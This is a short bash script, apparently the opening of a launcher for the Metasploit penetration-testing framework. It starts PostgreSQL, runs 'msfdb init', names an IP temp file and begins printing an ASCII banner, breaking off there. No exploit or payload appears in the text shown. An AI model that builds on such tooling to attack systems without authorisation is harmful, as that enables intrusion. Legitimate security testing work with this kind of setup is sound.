#!/bin/bash 
clear
echo "do you use systemctl or service? "
read sq
if [[ "$sq" == 'ctl' ]];
then 
sudo systemctl start postgresql
sudo msfdb init
clear
fi
if [[ "$sq" == 'service' ]];
then 
sudo service postgresql start
sudo msfdb init
clear
fi

ipfile="ip_file.tmp"
clear
echo "88888888888                    8888"
echo "88                               88"
echo "88                               88"
echo "88aaaaa ,adPPYba,  ,adPPYba, 88  88"
